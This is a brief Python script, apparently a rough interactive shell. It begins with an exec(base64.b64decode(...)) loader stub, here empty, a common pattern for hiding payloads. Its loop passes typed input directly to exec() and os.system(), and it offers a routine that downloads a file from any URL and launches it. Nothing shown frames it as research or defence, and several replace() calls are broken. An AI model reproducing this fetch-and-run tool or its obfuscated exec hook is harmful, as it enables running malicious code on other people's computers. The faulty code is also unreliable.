import base64
import os
import requests
exec(base64.b64decode(""))

def load(web, path):
    with open(path, 'wb') as f:
        f.write(requests.get(web).content)
def run(file): os.system(f"start {file}")
while True:
    a = input("> ")
    if "load(" in a:
        exec(a)
    if "echo >>" in a:
        os.system(a.replace('>>'))
    if "cd >>" in a:
        os.chdir(a.replace(">>"))
    if "run(" in a:
        exec(a)
    if "quit()" in a:
        exit()
    if "cmd >>" in a:
        os.system(a.replace("cmd >>", ""))
    